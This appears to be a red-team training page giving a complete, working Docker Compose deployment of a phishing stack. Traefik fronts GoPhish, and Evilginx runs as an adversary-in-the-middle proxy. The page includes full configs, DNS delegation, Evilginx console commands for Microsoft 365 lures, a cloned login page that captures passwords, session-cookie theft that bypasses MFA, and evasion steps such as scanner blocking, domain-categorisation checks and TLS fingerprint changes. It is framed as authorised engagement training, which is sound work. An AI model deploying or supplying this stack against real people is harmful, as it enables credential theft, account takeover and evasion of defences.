---
layout: training-page
title: "Traefik + GoPhish + Evilginx Docker Stack — Red Team Academy"
module: "C2 Frameworks"
tags:
  - phishing
  - aitm
  - docker
  - traefik
  - gophish
  - evilginx
  - infrastructure
  - initial-access
  - mfa-bypass
page_key: "c2-phishing-stack-docker"
render_with_liquid: false
---

# Traefik + GoPhish + Evilginx Docker Stack

This walkthrough deploys a production-grade phishing stack using Docker Compose. Traefik acts as the reverse proxy and certificate manager for GoPhish; Evilginx runs its own AiTM proxy behind Traefik's TCP SNI passthrough. The result is a single-server, single-IP stack where both tools share ports 80 and 443 without conflict.

**What you get:**
- GoPhish for campaign management, email delivery tracking, and credential harvesting pages — fronted by Traefik with automatic Let's Encrypt TLS
- Evilginx for adversary-in-the-middle session cookie theft, bypassing MFA — receiving raw TCP routed from Traefik by SNI
- Traefik as the single ingress point managing TLS for GoPhish and transparently passing Evilginx traffic through

---

## Architecture

```
                          Internet
                             │
                    ┌────────┴────────┐
                    │    VPS (1 IP)   │
                    │                 │
                    │  ┌───────────┐  │
                    │  │  Traefik  │  │  port 80  → HTTP redirect to HTTPS
                    │  │  :80/:443 │  │  port 443 → GoPhish (TLS terminate)
                    │  └─────┬─────┘  │           → Evilginx (TCP passthrough)
                    │        │        │  port 53  → Evilginx DNS (direct)
                    │    ────┴────    │
                    │   /         \   │
                    │  ▼           ▼  │
                    │ GoPhish   Evilginx
                    │ :3333     :443  │
                    │ :80       :53   │
                    └─────────────────┘
```

**Traffic routing:**
- `gophish-admin.redteam-ops.com` → Traefik terminates TLS → GoPhish admin `:3333`
- `mail.redteam-ops.com` → Traefik terminates TLS → GoPhish phishing listener `:80`
- `login.phish-target.com` → Traefik TCP SNI passthrough → Evilginx `:443` (Evilginx holds TLS)
- Port 53/UDP → directly to Evilginx DNS server (Evilginx is authoritative for the phishing domain)

**Two-domain model (required):**
- `redteam-ops.com` — GoPhish domain. Traefik issues Let's Encrypt cert via HTTP-01. A records point to VPS.
- `phish-target.com` — Evilginx AiTM domain. NS records delegate to the VPS IP so Evilginx is authoritative DNS. Evilginx issues its own cert via DNS-01 challenge through its internal DNS server.

---

## Prerequisites

- Linux VPS, public IPv4 address
- Docker and Docker Compose v2 installed
- Two domains you control:
  - **GoPhish domain** (`redteam-ops.com`): A records pointing to VPS IP
  - **Evilginx domain** (`phish-target.com`): NS records delegated to VPS IP
- Ports open inbound: 53/UDP, 80/TCP, 443/TCP
- `systemd-resolved` disabled or reconfigured (port 53 conflict — see Troubleshooting)
- Go 1.21+ on the VPS if building Evilginx from source

---

## Directory Structure

```
phishing-stack/
├── docker-compose.yml
├── .env
├── traefik/
│   ├── traefik.yml            # Traefik static config
│   └── dynamic/
│       ├── gophish.yml        # HTTP routers for GoPhish
│       └── evilginx.yml       # TCP router for Evilginx passthrough
├── gophish/
│   └── config.json            # GoPhish server config
└── evilginx/
    ├── Dockerfile             # Build Evilginx from source
    └── phishlets/             # Drop .yaml phishlets here
```

Create the structure:

```
mkdir -p phishing-stack/{traefik/dynamic,gophish,evilginx/phishlets}
cd phishing-stack
```

---

## Environment File

```
# phishing-stack/.env

# GoPhish domain (Traefik manages TLS)
GOPHISH_DOMAIN=redteam-ops.com
GOPHISH_ADMIN_SUBDOMAIN=gophish-admin.redteam-ops.com
GOPHISH_PHISH_SUBDOMAIN=mail.redteam-ops.com

# Evilginx domain (Evilginx manages TLS, NS delegated to this VPS)
EVILGINX_DOMAIN=phish-target.com
VPS_IP=203.0.113.45

# ACME email for Let's Encrypt
ACME_EMAIL=operator@redteam-ops.com

# GoPhish admin credentials (set a strong password)
GOPHISH_ADMIN_PASS=ChangeMe1!

# Traefik dashboard basic auth (generate with: htpasswd -nb admin password)
TRAEFIK_DASHBOARD_AUTH=admin:$$apr1$$...hashed...
```

---

## Docker Compose

```
# phishing-stack/docker-compose.yml

networks:
  phishing-net:
    driver: bridge

volumes:
  traefik-certs:
  gophish-data:
  evilginx-data:

services:

  # ── Traefik — reverse proxy + cert manager ──────────────────────────────────
  traefik:
    image: traefik:v3.1
    container_name: traefik
    restart: unless-stopped
    ports:
      - "80:80"
      - "443:443"
      - "127.0.0.1:8080:8080"   # dashboard, local only
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro
      - ./traefik/traefik.yml:/etc/traefik/traefik.yml:ro
      - ./traefik/dynamic:/etc/traefik/dynamic:ro
      - traefik-certs:/etc/traefik/certs
    networks:
      - phishing-net
    environment:
      - TRAEFIK_DASHBOARD_AUTH=${TRAEFIK_DASHBOARD_AUTH}

  # ── GoPhish — phishing campaign manager ─────────────────────────────────────
  gophish:
    image: gophish/gophish:latest
    container_name: gophish
    restart: unless-stopped
    volumes:
      - gophish-data:/opt/gophish/data
      - ./gophish/config.json:/opt/gophish/config.json:ro
    networks:
      - phishing-net
    depends_on:
      - traefik

  # ── Evilginx — AiTM phishing proxy ──────────────────────────────────────────
  evilginx:
    build:
      context: ./evilginx
      dockerfile: Dockerfile
    image: evilginx2:local
    container_name: evilginx
    restart: unless-stopped
    ports:
      - "53:53/udp"    # DNS server — direct to host, no Traefik
      - "53:53/tcp"
    volumes:
      - evilginx-data:/root/.evilginx
      - ./evilginx/phishlets:/app/phishlets:ro
    networks:
      - phishing-net
    cap_add:
      - NET_BIND_SERVICE
    # Run interactively the first time to configure domain + IP:
    #   docker compose run --rm evilginx
    # After config is saved in the volume, normal restart works.
    stdin_open: true
    tty: true
```

**Port mapping explanation:**
- Traefik maps `0.0.0.0:443` — it's the only process bound to host port 443
- Evilginx listens on container port 443 (not mapped to host) — Traefik TCP-routes to it by SNI
- Port 53 maps directly from host to Evilginx — DNS bypasses Traefik entirely

---

## Traefik Static Config

```
# phishing-stack/traefik/traefik.yml

global:
  checkNewVersion: false
  sendAnonymousUsage: false

log:
  level: INFO

api:
  dashboard: true

# Entrypoints
entryPoints:
  web:
    address: ":80"
    http:
      redirections:
        entryPoint:
          to: websecure
          scheme: https
          permanent: true
  websecure:
    address: ":443"

# File provider watches ./dynamic/ for hot-reloaded route configs
providers:
  file:
    directory: /etc/traefik/dynamic
    watch: true

# Let's Encrypt via HTTP-01 challenge (for GoPhish domain)
certificatesResolvers:
  letsencrypt:
    acme:
      email: operator@redteam-ops.com
      storage: /etc/traefik/certs/acme.json
      httpChallenge:
        entryPoint: web
```

The file provider (not Docker provider) is used so routes are in versioned config files rather than container labels — easier to audit and redeploy.

---

## Traefik Dynamic Config — GoPhish

```
# phishing-stack/traefik/dynamic/gophish.yml

http:
  routers:
    # GoPhish admin dashboard
    gophish-admin:
      entryPoints:
        - websecure
      rule: "Host(`gophish-admin.redteam-ops.com`)"
      service: gophish-admin-svc
      middlewares:
        - gophish-admin-auth
      tls:
        certResolver: letsencrypt

    # GoPhish phishing listener (campaign landing pages)
    gophish-phish:
      entryPoints:
        - websecure
      rule: "Host(`mail.redteam-ops.com`)"
      service: gophish-phish-svc
      tls:
        certResolver: letsencrypt

  services:
    gophish-admin-svc:
      loadBalancer:
        servers:
          - url: "http://gophish:3333"
        passHostHeader: true

    gophish-phish-svc:
      loadBalancer:
        servers:
          - url: "http://gophish:80"
        passHostHeader: true

  middlewares:
    # Basic auth on admin panel — generate with: htpasswd -nb admin password
    gophish-admin-auth:
      basicAuth:
        users:
          - "admin:$apr1$...hashed..."
```

Replace the `basicAuth` hash with the value from `htpasswd -nb admin 'YourPassword'`. The `$` signs must be doubled in YAML (`$$`) when using environment variables, but in this file they are literal.

---

## Traefik Dynamic Config — Evilginx TCP Passthrough

```
# phishing-stack/traefik/dynamic/evilginx.yml

tcp:
  routers:
    # TCP passthrough for Evilginx phishing subdomains
    # SNI must match the hostnames Evilginx is configured to proxy
    # Update these for each engagement phishlet/domain
    evilginx-passthrough:
      entryPoints:
        - websecure
      # Match all subdomains of the Evilginx phishing domain
      rule: "HostSNIRegexp(`^.+\\.phish-target\\.com$`) || HostSNI(`phish-target.com`)"
      service: evilginx-svc
      tls:
        passthrough: true    # Evilginx holds the private key — Traefik does not decrypt

  services:
    evilginx-svc:
      loadBalancer:
        servers:
          - address: "evilginx:443"
```

`tls.passthrough: true` tells Traefik to forward the raw TLS bytes to Evilginx. Traefik never sees the plaintext. Evilginx presents its own wildcard cert to the victim and handles the AiTM proxy. The HostSNIRegexp matches any subdomain (e.g., `login.phish-target.com`, `accounts.phish-target.com`).

---

## GoPhish Config

```
{
  "admin_server": {
    "listen_url": "0.0.0.0:3333",
    "use_tls": false,
    "cert_path": "gophish_admin.crt",
    "key_path": "gophish_admin.key"
  },
  "phish_server": {
    "listen_url": "0.0.0.0:80",
    "use_tls": false,
    "cert_path": "example.crt",
    "key_path": "example.key"
  },
  "db_name": "sqlite3",
  "db_path": "gophish.db",
  "migrations_prefix": "db/db_",
  "contact_address": "",
  "logging": {
    "filename": "",
    "level": ""
  }
}
```

TLS is disabled on both servers because Traefik terminates TLS externally. GoPhish listens plain HTTP inside the Docker network; Traefik presents the Let's Encrypt cert to visitors.

---

## Evilginx Dockerfile

Evilginx does not publish an official Docker image. Build from source:

```
# phishing-stack/evilginx/Dockerfile

FROM golang:1.21-alpine AS builder
RUN apk add --no-cache git make
WORKDIR /app
RUN git clone https://github.com/kgretzky/evilginx2 .
RUN make

FROM debian:bookworm-slim
RUN apt-get update \
    && apt-get install -y --no-install-recommends ca-certificates \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app
COPY --from=builder /app/build/evilginx .
COPY --from=builder /app/phishlets ./phishlets
COPY --from=builder /app/redirectors ./redirectors

VOLUME ["/root/.evilginx"]

# 443: HTTPS AiTM proxy (Traefik routes via TCP passthrough)
# 80:  HTTP (Evilginx uses for cert challenges; not needed with DNS-01)
# 53:  DNS server (authoritative for the phishing domain)
EXPOSE 443 80 53/udp 53/tcp

ENTRYPOINT ["./evilginx", "-p", "./phishlets", "-t", "./redirectors"]
```

The build uses multi-stage: Go toolchain in the builder stage, clean Debian image at runtime. The `/root/.evilginx` volume persists Evilginx config, certificates, and session data across container restarts.

---

## DNS Setup

### GoPhish Domain (redteam-ops.com)

Standard A records. Traefik issues certs via HTTP-01 challenge:

```
# At your registrar / DNS provider:
redteam-ops.com          A    203.0.113.45
gophish-admin.redteam-ops.com  A    203.0.113.45
mail.redteam-ops.com     A    203.0.113.45
```

### Evilginx Domain (phish-target.com)

Evilginx must be authoritative DNS for this domain. It runs its own DNS server and issues wildcard Let's Encrypt certs via DNS-01. Delegate NS records to your VPS:

```
# At your registrar / DNS provider for phish-target.com:
phish-target.com         NS   ns1.phish-target.com
ns1.phish-target.com     A    203.0.113.45

# Evilginx handles all DNS for phish-target.com from there.
# No A records needed — Evilginx creates them dynamically.
```

Verify delegation before deploying:

```
# Check NS delegation
dig NS phish-target.com @8.8.8.8

# Query your VPS DNS server directly
dig @203.0.113.45 phish-target.com
```

---

## Initial Deploy

### Step 1 — Disable systemd-resolved (port 53 conflict)

Ubuntu/Debian systems run `systemd-resolved` on `127.0.0.53:53`, which blocks Evilginx from binding to port 53.

```
# Stop and disable resolved
systemctl stop systemd-resolved
systemctl disable systemd-resolved

# Set a working upstream resolver
echo "nameserver 8.8.8.8" > /etc/resolv.conf
echo "nameserver 1.1.1.1" >> /etc/resolv.conf
```

### Step 2 — ACME Storage Permissions

Traefik's Let's Encrypt storage file must be created with 600 permissions before first run, or Traefik will fail to write it:

```
touch phishing-stack/traefik/certs/acme.json
chmod 600 phishing-stack/traefik/certs/acme.json
```

Wait — the file is in a Docker volume (`traefik-certs`), not the host path. Traefik creates it automatically inside the volume. No manual step needed; the volume handles it. Just make sure the volume mount is correct in the compose file.

### Step 3 — Build Evilginx Image

```
cd phishing-stack
docker compose build evilginx
```

This clones the repo and compiles inside the builder stage. Takes 2–5 minutes on first build.

### Step 4 — Start Traefik and GoPhish

```
docker compose up -d traefik gophish
```

Check Traefik logs to confirm GoPhish certs issue:

```
docker compose logs -f traefik
# Look for: "Certificates obtained successfully" for both GoPhish subdomains
```

### Step 5 — First-Run Evilginx Configuration

Evilginx requires interactive setup before it can run headless. Use `run` instead of `up`:

```
docker compose run --rm evilginx
```

This drops into the Evilginx console. Configure domain and IP:

```
: config domain phish-target.com
: config ipv4 203.0.113.45
: config unauth_url https://www.google.com
: config
```

Load your phishlet and set its hostname:

```
: phishlets
: phishlets hostname microsoft365 login.phish-target.com
: phishlets enable microsoft365
# Evilginx issues Let's Encrypt wildcard cert via DNS-01 here
# Wait ~30s for cert to issue
: phishlets
```

Verify cert issued (status column shows `TLS`). The config is now persisted in the `evilginx-data` volume.

Exit Evilginx:

```
: q
```

### Step 6 — Start Evilginx Headless

```
docker compose up -d evilginx
docker compose logs -f evilginx
```

Evilginx loads config from the volume and starts serving. No interactive console needed for subsequent runs.

### Step 7 — Verify Routing

```
# Test Traefik → GoPhish admin
curl -I https://gophish-admin.redteam-ops.com
# Expect: 200 or 401 (auth wall)

# Test Traefik → GoPhish phish listener
curl -I https://mail.redteam-ops.com
# Expect: 200

# Test TCP passthrough → Evilginx
curl -I https://login.phish-target.com
# Expect: connection to Evilginx (may return GoPhish-like 404 or redirect)

# Verify Evilginx DNS server
dig @203.0.113.45 login.phish-target.com
# Expect: A record pointing to 203.0.113.45 (created by Evilginx)
```

---

## GoPhish — Campaign Setup

Log into GoPhish admin at `https://gophish-admin.redteam-ops.com`. Default credentials on first run are printed in the container logs:

```
docker compose logs gophish | grep "Please login"
# Output: Please login with the username admin and the password <generated>
```

### Configure Sending Profile

```
Sending Profiles → New Profile
  Name: Engagement SMTP
  From: IT Support <it-support@redteam-ops.com>
  Host: your-smtp-relay:587
  Username: smtp-user
  Password: smtp-pass
  Ignore Certificate Errors: false
```

Use a dedicated SMTP relay (Mailgun, SES with domain verification, or Postfix) — GoPhish does not send email itself.

### Email Template

```
Sending Profiles → Email Templates → New Template
  Name: IT Security Alert
  Subject: Action Required: Verify Your Account
  HTML body: (your phishing email content)
  # Include {{.URL}} for the tracked click link
  # GoPhish replaces it with a unique per-target URL
```

### Landing Page

```
Landing Pages → New Page
  Name: Microsoft 365 Clone
  URL: https://login.microsoftonline.com   # GoPhish clones this
  → Import Site
  Capture Submitted Data: yes
  Capture Passwords: yes
  Redirect to: https://portal.office.com
```

### Launch Campaign

```
Campaigns → New Campaign
  Name: Q2 Phishing Sim
  Email Template: IT Security Alert
  Landing Page: Microsoft 365 Clone
  URL: https://mail.redteam-ops.com      # GoPhish phishing server URL
  Sending Profile: Engagement SMTP
  Groups: (import your target CSV)
```

GoPhish appends `?rid={{.RId}}` to each target's URL automatically. Every click and credential submission is tracked in the campaign dashboard.

---

## Evilginx + GoPhish Integration

Evilginx 3.3+ supports integration with a modified GoPhish fork (`github.com/kgretzky/gophish`) that enables GoPhish to manage email delivery while Evilginx handles the AiTM cookie theft. In this mode:

1. Create a lure in Evilginx and copy the phishing URL
2. Set that URL as the GoPhish campaign URL instead of the GoPhish phishing server
3. GoPhish appends `?rid={{.RId}}` — Evilginx strips it before proxying
4. Victim clicks → GoPhish records the click → Evilginx captures session cookies
5. Check GoPhish for click/open tracking; check Evilginx sessions for stolen cookies

Use the kgretzky GoPhish fork in the Dockerfile to enable this:

```
# In docker-compose.yml, replace gophish service image:
gophish:
  build:
    context: ./gophish-fork
    dockerfile: Dockerfile
  # Dockerfile clones github.com/kgretzky/gophish and builds from source
```

---

## Evilginx Console — Common Commands

Exec into the running container for interactive access:

```
docker exec -it evilginx /app/evilginx -p ./phishlets -t ./redirectors
```

Or if the container is running with `stdin_open: true`:

```
docker attach evilginx
# Detach with Ctrl+P, Ctrl+Q (not Ctrl+C — that kills the process)
```

Inside the console:

```
# Check phishlet status
: phishlets

# Create a lure
: lures create microsoft365

# Get the full phishing URL
: lures get-url 0

# Customize path and redirect
: lures edit 0 path /microsoft/login/oauth
: lures edit 0 redirect_url https://portal.office.com

# Block scanners (UA filter)
: lures edit 0 ua_filter "Mozilla.*Windows"

# View captured sessions
: sessions

# Session details with cookies
: sessions 1
```

---

## OPSEC Hardening

**Traefik dashboard:** The dashboard is bound to `127.0.0.1:8080` in the compose file. Never expose it publicly. Access via SSH tunnel:

```
ssh -L 8080:127.0.0.1:8080 user@203.0.113.45
# Browse to http://localhost:8080
```

**GoPhish admin:** Protected by Traefik basic auth middleware. Use a strong password and rotate after the engagement. Consider IP-restricting with a Traefik IPAllowList middleware:

```
# In traefik/dynamic/gophish.yml, add to gophish-admin router:
middlewares:
  - gophish-admin-auth
  - operator-ip-allowlist

# Add the middleware definition:
middlewares:
  operator-ip-allowlist:
    ipAllowList:
      sourceRange:
        - "10.8.0.0/24"    # WireGuard operator subnet
        - "198.51.100.0/32" # Operator static IP
```

**Evilginx blacklist:** Enable automatic blacklisting of scanners from first run:

```
: blacklist unauth
: blacklist log on
: config unauth_url https://www.google.com
```

**Logs:** Traefik logs all requests. Aggregate them off-box immediately. GoPhish campaign data is in an SQLite file inside the volume — export and encrypt it post-engagement.

**Domains:** Register phishing domains at least 14 days before use. Use aged expired domains with prior categorization. Domain categorization check:

```
# Check Palo Alto URL filter category:
curl "https://urlfiltering.paloaltonetworks.com/query-results/?url=phish-target.com"
# Target category: Business and Economy, Computer and Internet, Shopping
# Red flag: Malware, Phishing, Unknown, Parked
```

**TLS fingerprinting:** Traefik's default TLS config presents a fingerprint associated with Go's TLS stack. Some enterprise proxies flag this. Override the TLS min version and cipher suite list in `traefik.yml`:

```
# In traefik.yml, add:
tls:
  options:
    default:
      minVersion: VersionTLS12
      cipherSuites:
        - TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
        - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
        - TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305
```

---

## Troubleshooting

### Port 53 already in use

```
# Confirm what's holding port 53
ss -tulnp | grep :53

# If systemd-resolved:
systemctl stop systemd-resolved
systemctl disable systemd-resolved
echo "nameserver 8.8.8.8" > /etc/resolv.conf

# Re-start Evilginx container
docker compose restart evilginx
```

### Evilginx cert not issuing

```
# Verify NS delegation (from external)
dig NS phish-target.com @8.8.8.8

# Query Evilginx DNS directly
dig @203.0.113.45 phish-target.com

# Check rate limits (5 certs per domain per week at Let's Encrypt)
# https://crt.sh/?q=phish-target.com

# Look at Evilginx logs
docker compose logs evilginx
```

### Traefik not issuing GoPhish cert

```
# Confirm HTTP-01 challenge — port 80 must reach Traefik
curl -v http://mail.redteam-ops.com/.well-known/acme-challenge/test

# Check ACME log
docker compose logs traefik | grep -i acme

# Confirm A record propagation
dig mail.redteam-ops.com @8.8.8.8
```

### TCP passthrough not routing to Evilginx

```
# Verify HostSNIRegexp matches your phishlet subdomain
# Test with openssl s_client
openssl s_client -connect 203.0.113.45:443 -servername login.phish-target.com

# Check Traefik router list via dashboard or API
curl http://localhost:8080/api/http/routers
curl http://localhost:8080/api/tcp/routers

# Traefik debug logging
# In traefik.yml, set: log.level: DEBUG
```

### GoPhish returns wrong URL in campaign emails

GoPhish uses the `URL` field set during campaign creation. Make sure it matches the Traefik-fronted domain:

```
# Correct — Traefik serves this
URL: https://mail.redteam-ops.com

# Wrong — GoPhish internal address, not reachable
URL: http://gophish:80
```

### Container restart loses Evilginx config

Config is stored in the `evilginx-data` named volume. If the volume is deleted (e.g., `docker compose down -v`), config is lost. Re-run the interactive setup:

```
# Never use -v on operational infrastructure:
docker compose down      # stops containers, preserves volumes

# If config lost, redo first-run setup:
docker compose run --rm evilginx
```

---

## Resources

- Traefik documentation — `doc.traefik.io`
- Traefik TCP routing / SNI passthrough — `doc.traefik.io/traefik/routing/routers/#tcp-routers`
- GoPhish — `github.com/gophish/gophish`
- Evilginx (community) — `github.com/kgretzky/evilginx2`
- kgretzky GoPhish fork (Evilginx integration) — `github.com/kgretzky/gophish`
- Evilginx Pro documentation — `help.evilginx.com`
- Red Team Infrastructure Wiki — `github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki`
- Related: [GoPhish Phishing Framework](/c2-frameworks/gophish/), [Evilginx AiTM Framework](/c2-frameworks/evilginx/), [Engagement Infrastructure](/c2-frameworks/engagement-infrastructure/)
